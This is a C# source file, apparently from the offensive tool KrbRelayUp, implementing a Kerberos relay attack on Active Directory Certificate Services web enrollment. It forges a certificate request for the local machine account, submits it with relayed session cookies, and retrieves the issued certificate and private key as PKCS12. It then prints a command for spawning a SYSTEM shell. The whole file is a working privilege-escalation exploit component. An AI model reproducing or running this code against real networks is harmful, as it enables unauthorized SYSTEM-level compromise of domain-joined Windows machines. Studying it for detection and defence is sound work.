using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.OpenSsl;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Asn1.Pkcs;
using static KrbRelayUp.Relay.Http;
using KrbRelayUp.Relay.Misc;

namespace KrbRelayUp.Relay.Attacks.Http
{
    class ADCS
    {
        public static void attack()
        {
            var random = new SecureRandom();
            var keyGenerationParameters = new KeyGenerationParameters(random, 4096);

            RsaKeyPairGenerator generator = new RsaKeyPairGenerator();
            generator.Init(keyGenerationParameters);

            var keyPair = generator.GenerateKeyPair();

            // set the attributes of the cert
            var cert_attribs = new Dictionary<DerObjectIdentifier, string>
            {
                { X509Name.CN, $"{Options.domain}\\{Environment.MachineName}$" },
            };

            var subject = new X509Name(cert_attribs.Keys.ToList(), cert_attribs);

            // generate the CSR
            Console.WriteLine($"[+] Generating CSR");
            var pkcs10CertificationRequest = new Pkcs10CertificationRequest(PkcsObjectIdentifiers.Sha256WithRsaEncryption.Id, subject, keyPair.Public, null, keyPair.Private);
            var csr = Convert.ToBase64String(pkcs10CertificationRequest.GetEncoded());

            // correctly format the certificate
            var formatted_csr = "";
            formatted_csr += "-----BEGIN CERTIFICATE REQUEST-----";
            formatted_csr += csr;
            formatted_csr += "-----END CERTIFICATE REQUEST-----";
            formatted_csr = formatted_csr.Replace("\n", "").Replace("+", "%2b").Replace(" ", "+");

            Console.WriteLine($"[+] CSR Generated");

            Console.WriteLine($"[+] Requesting certificate for \"{Environment.MachineName}$\" using \"{Options.certificateTemplate}\" template");
            string data = $"Mode=newreq&CertRequest={formatted_csr}&CertAttrib=CertificateTemplate:{Options.certificateTemplate}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=";
            HttpWebResponse response = SendWebRequest($"{((Options.https) ? "https://" : "http://")}{Options.caEndpoint}/certsrv/certfnsh.asp", "POST", data, "Cookie", cookies);

            string responseFromServer = new StreamReader(response.GetResponseStream()).ReadToEnd();

            //Console.WriteLine(responseFromServer);

            if (responseFromServer.Contains("locDenied"))
            {
                Console.WriteLine($"[-] Certificate request for '{Options.certificateTemplate}' template denied. Try again with a different template.");
                response.Close();
                return;
            }

            // find the req id of the certificate
            string pattern = @"location=""certnew.cer\?ReqID=(.*?)&";
            Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);

            string reqid = null;
            var match = rgx.Match(responseFromServer);

            reqid = match.Groups[1].ToString();

            if (reqid.Length == 0)
            {
                Console.WriteLine("[-] Failed to find the certificate request id... dumping all page content.\n");
                Console.WriteLine(responseFromServer);
                Environment.Exit(1);
            }

            response.Close();

            Console.WriteLine("[+] Success (ReqID: " + reqid + ")");
            Console.WriteLine("[+] Downloading certificate");

            response = SendWebRequest($"{((Options.https) ? "https://" : "http://")}{Options.caEndpoint}/certsrv/certnew.cer?ReqID={reqid}", "GET", "", "Cookie", cookies);

            string certificate = new StreamReader(response.GetResponseStream()).ReadToEnd();

            response.Close();

            Console.WriteLine("[+] Exporting certificate & private key");

            // bundle together certificate and the private key
            var privatekey = new StringWriter();
            var pemWriter = new PemWriter(privatekey);

            pemWriter.WriteObject(keyPair.Private);
            privatekey.Flush();
            privatekey.Close();

            var bundle = certificate + privatekey.ToString();

            Console.WriteLine("[+] Converting into PKCS12");

            Options.shadowCredCertificate = PKCS12.ConvertToPKCS12(bundle);

            if (Options.phase != Options.PhaseType.Full)
            {
                Console.WriteLine("[+] Relay finished successfully!");
                Console.WriteLine("[+] Run the spawn method for SYSTEM shell:");
                Console.WriteLine($"    ./KrbRelayUp.exe spawn -m adcs -d {Options.domain} -dc {Options.domainController} -ca {Options.caEndpoint} -ce {Options.shadowCredCertificate}");
            }
            else
            {
                Console.WriteLine($"[+] Certificate: {Options.shadowCredCertificate}");
            }

            Options.attackDone = true;

        }

    }
}
